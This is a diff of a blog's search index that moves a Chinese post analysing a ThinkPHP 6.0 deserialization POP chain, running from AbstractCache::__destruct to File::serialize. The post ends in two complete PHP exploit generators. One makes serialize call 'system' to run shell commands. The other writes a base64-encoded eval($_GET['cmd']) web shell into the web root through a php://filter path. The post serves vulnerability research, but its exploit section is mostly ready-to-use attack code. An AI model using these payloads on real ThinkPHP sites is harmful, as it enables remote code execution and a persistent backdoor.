@@ -1,6 +1,55 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>ThinkPHP6.0.*反序列化漏洞-2</title>
+    <url>/2022/03/18/ThinkPHP6-0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/</url>
+    <content><![CDATA[<h2 id="0x01-搭建环境"><a href="#0x01-搭建环境" class="headerlink" title="0x01-搭建环境"></a>0x01-搭建环境</h2><p>详见前文</p>
+<h2 id="0x02-利用条件"><a href="#0x02-利用条件" class="headerlink" title="0x02-利用条件"></a>0x02-利用条件</h2><p>详见前文</p>
+<h2 id="0x03-知识要点"><a href="#0x03-知识要点" class="headerlink" title="0x03-知识要点"></a>0x03-知识要点</h2><p>官方文档介绍 ThinkPHP 6.* 启动方式是在终端输入 <code>php think run</code>，启动之后会在终端滚动显示应用运行的情况。通过测试，当通过 <code>system</code> 函数在终端下执行如下形式，<code>system([],&quot;`whoami`&quot;)</code>，可正式执行 <code>whoami</code> 函数，这是由于 shell 中的优先级高，所以会先执行 &#96;&#96; 中的内容，再把执行结果拼接成一个新命令，但是实际上system函数是报错的，所以实际环境不一定会显示出执行后的报错信息。</p>
+<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage16286640471.png"></p>
+<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage16286645101.png"></p>
+<h2 id="0x04-构造POP"><a href="#0x04-构造POP" class="headerlink" title="0x04-构造POP"></a>0x04-构造POP</h2><h3 id="搜索-destruct-方法"><a href="#搜索-destruct-方法" class="headerlink" title="搜索 __destruct 方法"></a>搜索 __destruct 方法</h3><p>全文搜索 <code>__destruct</code> ，发现 <code>/vendor/league/flysystem-cached-adapter/src/Storage/AbstractCache.php</code> 存在该方法，尝试从该点出发挖掘反序列化漏洞。根据 <code>__destruct</code> 方法代码可知，当 <code>$this-&gt;autosave= false</code> 的时候，会进入 <code>$this-&gt;save()</code> 方法。</p>
+<h3 id="跟进-save-方法"><a href="#跟进-save-方法" class="headerlink" title="跟进 save() 方法"></a>跟进 save() 方法</h3><p>发现没有实现 <code>save()</code> 方法的代码，尝试查找继承了 AbstractCache 并且实现了 save 方法的继承类。找到如下：<code>/vendor/topthink/framework/src/think/filesystem/CacheStore.php</code> ，<code>save()</code> 方法实现如下：</p>
+<p><strong>save()：</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$contents</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getForStorage</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">$this</span>-&gt;store-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$this</span>-&gt;key, <span class="variable">$contents</span>, <span class="variable">$this</span>-&gt;expire);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进 <code>getForStorage()</code> ，发现 <code>cleanContents()</code> 方法，跟进 <code>cleanContents()</code> 方法，该代码大概意思就是从<code> $contents[$path]</code> 列表中提取键名与 <code>[&#39;path&#39;, &#39;dirname&#39;, ...]</code> 相同键值对，同时更新 <code>$contents[$path]</code> 的值。未发现可利用方法。<br>返回getForStorage()，接下来的代码是reture一个经过json_encode处理的数组。</p>
+<p><strong>getForStorage()：</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$cleaned</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">cleanContents</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>([<span class="variable">$cleaned</span>, <span class="variable">$this</span>-&gt;complete]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>cleanContents()：</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$contents</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$cachedProperties</span> = <span class="title function_ invoke__">array_flip</span>([</span><br><span class="line"><span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;md5&#x27;</span>,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$contents</span> <span class="keyword">as</span> <span class="variable">$path</span> =&gt; <span class="variable">$object</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$object</span>)) &#123;</span><br><span class="line"><span class="variable">$contents</span>[<span class="variable">$path</span>] = <span class="title function_ invoke__">array_intersect_key</span>(<span class="variable">$object</span>, <span class="variable">$cachedProperties</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>回到 <code>save()</code> 方法，继续观察后续代码。发现 <code>$this-&gt;store</code> 可以控制，即我们调用任意类的 set 方法，或者触发任意不存在 save 方法类的 <code>__call</code> 魔术方法。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;store-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$this</span>-&gt;key, <span class="variable">$contents</span>, <span class="variable">$this</span>-&gt;expire);</span><br></pre></td></tr></table></figure>
+
+<p>找到<code>/vendor/topthink/framework/src/think/cache/driver/File.php</code></p>
+<h3 id="跟进-set-方法"><a href="#跟进-set-方法" class="headerlink" title="跟进 set 方法"></a>跟进 set 方法</h3><p><code>getExpireTime()</code> 方法为获取过期时间。<br><code>getCacheKey()</code> 方法为获取文件存储名字。</p>
+<h3 id="跟进serialize-方法"><a href="#跟进serialize-方法" class="headerlink" title="跟进serialize()方法"></a>跟进serialize()方法</h3><p>发现可利用点，<code>$serialize($data)</code>。其中 <code>$serialize</code> 由 <code>$this-&gt;options[&#39;serialize&#39;][0]</code> 控制，<code>$this-&gt;options[&#39;serialize&#39;][0]</code> 可控。<code>$data</code> 的来源为 $<code>contents = $this-&gt;getForStorage() --&gt; set($this-&gt;key, $contents, $this-&gt;expire) --&gt; set($name, $value, $expire = null) --&gt; serialize($value) --&gt; $serialize($data)</code> ，即 <code>$data</code> 源于<code>$this-&gt;getForStorage()</code>。上面已经跟进过 <code>getForStorage()</code> 方法，<code>getForStorage()</code> 方法中的<code>$cleaned</code> 、<code>$this-&gt;complete</code> 均可控，所以返回结果即可以控制。</p>
+<p><strong>serialize():</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params"><span class="variable">$data</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">string</span>) <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>][<span class="number">0</span>] ?? <span class="string">&quot;serialize&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$serialize</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$serialize</span>(<span class="variable">$data</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$serialize</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage16286677451.png"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;autosave = <span class="literal">false</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;store = <span class="keyword">new</span> \think\cache\Driver\<span class="title function_ invoke__">File</span>()</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="variable language_">$this</span>-&gt;complete = <span class="string">&quot;`whoami`&quot;</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>][<span class="number">0</span>] = <span class="string">&quot;system&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>调用过程如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__destruct</span>()——&gt;<span class="title function_ invoke__">save</span>()——&gt;\think\cache<span class="title class_">\Driver\File</span>::<span class="title function_ invoke__">set</span>()——&gt;<span class="title function_ invoke__">serialize</span>()--&gt;<span class="variable">$serialize</span>(<span class="variable">$data</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-EXP"><a href="#0x05-EXP" class="headerlink" title="0x05-EXP"></a>0x05-EXP</h2><h3 id="EXP-1："><a href="#EXP-1：" class="headerlink" title="EXP_1："></a>EXP_1：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">filesystem</span>&#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">Psr</span>\<span class="title class_">SimpleCache</span>\<span class="title class_">CacheInterface</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">CacheStore</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$autosave</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$complete</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;key = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;store = <span class="keyword">new</span> \think\cache\Driver\<span class="title function_ invoke__">File</span>();</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;complete=[<span class="string">&quot;`whoami`&quot;</span>];</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">CacheStore</span>();</span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">Driver</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$options</span> = [</span><br><span class="line"> <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line"> <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line"> <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;path&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;hash_type&#x27;</span> =&gt; <span class="string">&#x27;md5&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"> <span class="string">&#x27;tag_prefix&#x27;</span> =&gt; <span class="string">&#x27;tag:&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;serialize&#x27;</span> =&gt; [],</span><br><span class="line"> ];</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>][<span class="number">0</span>] = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="EXP-2（文件写入操作，与上面大同小异，不做论述）："><a href="#EXP-2（文件写入操作，与上面大同小异，不做论述）：" class="headerlink" title="EXP_2（文件写入操作，与上面大同小异，不做论述）："></a>EXP_2（文件写入操作，与上面大同小异，不做论述）：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">filesystem</span>&#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">Psr</span>\<span class="title class_">SimpleCache</span>\<span class="title class_">CacheInterface</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">CacheStore</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$autosave</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$complete</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;key = <span class="string">&quot;shell&quot;</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;store = <span class="keyword">new</span> \think\cache\Driver\<span class="title function_ invoke__">File</span>();</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;expire = <span class="number">1</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;complete=<span class="string">&quot;aaaaPD9waHAgZXZhbCgkR0VUWyJjbWQiXSk7Pz4=&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">CacheStore</span>();</span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">Driver</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$options</span> = [</span><br><span class="line"> <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line"> <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"> <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;path&#x27;</span> =&gt; <span class="string">&#x27;php://filter/write=convert.base64-decode/resource=/var/www/html/thinkphp6.0-dev/public/&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;hash_type&#x27;</span> =&gt; <span class="string">&#x27;md5&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"> <span class="string">&#x27;tag_prefix&#x27;</span> =&gt; <span class="string">&#x27;tag:&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;serialize&#x27;</span> =&gt; [],</span><br><span class="line"> ];</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>] = [];</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://www.dazhuanlan.com/naiyouhzu/topics/1541898">https://www.dazhuanlan.com/naiyouhzu/topics/1541898</a></p>
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>反序列化</tag>
+        <tag>ThinkPHP</tag>
+        <tag>WEB安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ThinkPHP6.0.*反序列化漏洞-1</title>
     <url>/2022/03/19/ThinkPHP6-0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/</url>
     <content><![CDATA[<h2 id="0x01-搭建环境"><a href="#0x01-搭建环境" class="headerlink" title="0x01-搭建环境"></a>0x01-搭建环境</h2><h3 id="官方安装教程：https-www-kancloud-cn-manual-thinkphp6-0-1037481"><a href="#官方安装教程：https-www-kancloud-cn-manual-thinkphp6-0-1037481" class="headerlink" title="官方安装教程：https://www.kancloud.cn/manual/thinkphp6_0/1037481"></a>官方安装教程：<a href="https://www.kancloud.cn/manual/thinkphp6_0/1037481">https://www.kancloud.cn/manual/thinkphp6_0/1037481</a></h3><h3 id="踩坑一"><a href="#踩坑一" class="headerlink" title="踩坑一"></a>踩坑一</h3><p>可能遇到的问题 composer 目录为空的情况，解决办法如下：</p>
@@ -55,55 +104,6 @@
       </tags>
   </entry>
   <entry>
-    <title>ThinkPHP6.0.*反序列化漏洞-2</title>
-    <url>/2022/03/18/ThinkPHP6-0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/</url>
-    <content><![CDATA[<h2 id="0x01-搭建环境"><a href="#0x01-搭建环境" class="headerlink" title="0x01-搭建环境"></a>0x01-搭建环境</h2><p>详见前文</p>
-<h2 id="0x02-利用条件"><a href="#0x02-利用条件" class="headerlink" title="0x02-利用条件"></a>0x02-利用条件</h2><p>详见前文</p>
-<h2 id="0x03-知识要点"><a href="#0x03-知识要点" class="headerlink" title="0x03-知识要点"></a>0x03-知识要点</h2><p>官方文档介绍 ThinkPHP 6.* 启动方式是在终端输入 <code>php think run</code>，启动之后会在终端滚动显示应用运行的情况。通过测试，当通过 <code>system</code> 函数在终端下执行如下形式，<code>system([],&quot;`whoami`&quot;)</code>，可正式执行 <code>whoami</code> 函数，这是由于 shell 中的优先级高，所以会先执行 &#96;&#96; 中的内容，再把执行结果拼接成一个新命令，但是实际上system函数是报错的，所以实际环境不一定会显示出执行后的报错信息。</p>
-<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage16286640471.png"></p>
-<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage16286645101.png"></p>
-<h2 id="0x04-构造POP"><a href="#0x04-构造POP" class="headerlink" title="0x04-构造POP"></a>0x04-构造POP</h2><h3 id="搜索-destruct-方法"><a href="#搜索-destruct-方法" class="headerlink" title="搜索 __destruct 方法"></a>搜索 __destruct 方法</h3><p>全文搜索 <code>__destruct</code> ，发现 <code>/vendor/league/flysystem-cached-adapter/src/Storage/AbstractCache.php</code> 存在该方法，尝试从该点出发挖掘反序列化漏洞。根据 <code>__destruct</code> 方法代码可知，当 <code>$this-&gt;autosave= false</code> 的时候，会进入 <code>$this-&gt;save()</code> 方法。</p>
-<h3 id="跟进-save-方法"><a href="#跟进-save-方法" class="headerlink" title="跟进 save() 方法"></a>跟进 save() 方法</h3><p>发现没有实现 <code>save()</code> 方法的代码，尝试查找继承了 AbstractCache 并且实现了 save 方法的继承类。找到如下：<code>/vendor/topthink/framework/src/think/filesystem/CacheStore.php</code> ，<code>save()</code> 方法实现如下：</p>
-<p><strong>save()：</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$contents</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getForStorage</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">$this</span>-&gt;store-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$this</span>-&gt;key, <span class="variable">$contents</span>, <span class="variable">$this</span>-&gt;expire);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>跟进 <code>getForStorage()</code> ，发现 <code>cleanContents()</code> 方法，跟进 <code>cleanContents()</code> 方法，该代码大概意思就是从<code> $contents[$path]</code> 列表中提取键名与 <code>[&#39;path&#39;, &#39;dirname&#39;, ...]</code> 相同键值对，同时更新 <code>$contents[$path]</code> 的值。未发现可利用方法。<br>返回getForStorage()，接下来的代码是reture一个经过json_encode处理的数组。</p>
-<p><strong>getForStorage()：</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$cleaned</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">cleanContents</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>([<span class="variable">$cleaned</span>, <span class="variable">$this</span>-&gt;complete]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><strong>cleanContents()：</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$contents</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$cachedProperties</span> = <span class="title function_ invoke__">array_flip</span>([</span><br><span class="line"><span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;md5&#x27;</span>,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$contents</span> <span class="keyword">as</span> <span class="variable">$path</span> =&gt; <span class="variable">$object</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$object</span>)) &#123;</span><br><span class="line"><span class="variable">$contents</span>[<span class="variable">$path</span>] = <span class="title function_ invoke__">array_intersect_key</span>(<span class="variable">$object</span>, <span class="variable">$cachedProperties</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>回到 <code>save()</code> 方法，继续观察后续代码。发现 <code>$this-&gt;store</code> 可以控制，即我们调用任意类的 set 方法，或者触发任意不存在 save 方法类的 <code>__call</code> 魔术方法。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;store-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$this</span>-&gt;key, <span class="variable">$contents</span>, <span class="variable">$this</span>-&gt;expire);</span><br></pre></td></tr></table></figure>
-
-<p>找到<code>/vendor/topthink/framework/src/think/cache/driver/File.php</code></p>
-<h3 id="跟进-set-方法"><a href="#跟进-set-方法" class="headerlink" title="跟进 set 方法"></a>跟进 set 方法</h3><p><code>getExpireTime()</code> 方法为获取过期时间。<br><code>getCacheKey()</code> 方法为获取文件存储名字。</p>
-<h3 id="跟进serialize-方法"><a href="#跟进serialize-方法" class="headerlink" title="跟进serialize()方法"></a>跟进serialize()方法</h3><p>发现可利用点，<code>$serialize($data)</code>。其中 <code>$serialize</code> 由 <code>$this-&gt;options[&#39;serialize&#39;][0]</code> 控制，<code>$this-&gt;options[&#39;serialize&#39;][0]</code> 可控。<code>$data</code> 的来源为 $<code>contents = $this-&gt;getForStorage() --&gt; set($this-&gt;key, $contents, $this-&gt;expire) --&gt; set($name, $value, $expire = null) --&gt; serialize($value) --&gt; $serialize($data)</code> ，即 <code>$data</code> 源于<code>$this-&gt;getForStorage()</code>。上面已经跟进过 <code>getForStorage()</code> 方法，<code>getForStorage()</code> 方法中的<code>$cleaned</code> 、<code>$this-&gt;complete</code> 均可控，所以返回结果即可以控制。</p>
-<p><strong>serialize():</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params"><span class="variable">$data</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">string</span>) <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>][<span class="number">0</span>] ?? <span class="string">&quot;serialize&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$serialize</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$serialize</span>(<span class="variable">$data</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$serialize</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage16286677451.png"></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;autosave = <span class="literal">false</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;store = <span class="keyword">new</span> \think\cache\Driver\<span class="title function_ invoke__">File</span>()</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="variable language_">$this</span>-&gt;complete = <span class="string">&quot;`whoami`&quot;</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>][<span class="number">0</span>] = <span class="string">&quot;system&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>调用过程如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__destruct</span>()——&gt;<span class="title function_ invoke__">save</span>()——&gt;\think\cache<span class="title class_">\Driver\File</span>::<span class="title function_ invoke__">set</span>()——&gt;<span class="title function_ invoke__">serialize</span>()--&gt;<span class="variable">$serialize</span>(<span class="variable">$data</span>)</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x05-EXP"><a href="#0x05-EXP" class="headerlink" title="0x05-EXP"></a>0x05-EXP</h2><h3 id="EXP-1："><a href="#EXP-1：" class="headerlink" title="EXP_1："></a>EXP_1：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">filesystem</span>&#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">Psr</span>\<span class="title class_">SimpleCache</span>\<span class="title class_">CacheInterface</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">CacheStore</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$autosave</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span 